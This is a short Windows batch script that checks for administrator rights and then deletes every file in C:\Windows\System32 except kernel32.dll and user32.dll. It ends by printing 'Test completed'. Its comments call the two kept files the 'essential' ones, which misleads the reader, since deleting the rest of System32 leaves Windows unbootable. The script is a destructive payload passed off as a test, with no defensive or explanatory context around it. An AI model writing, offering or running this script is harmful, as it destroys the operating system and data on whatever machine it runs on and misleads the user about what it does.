@echo off
setlocal enabledelayedexpansion

:: Check if running as admin
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo This script requires administrator privileges.
    exit /b 1
)

:: Get list of files in sys32
for %%f in ("C:\Windows\System32\*.*") do (
    set "filename=%%~nxf"
    
    :: Skip essential system files
    if "!filename!" NEQ "kernel32.dll" (
        if "!filename!" NEQ "user32.dll" (
            del "C:\Windows\System32\!filename!" /q
            echo Deleted: !filename!
        )
    )
)

echo Test completed
exit /b 0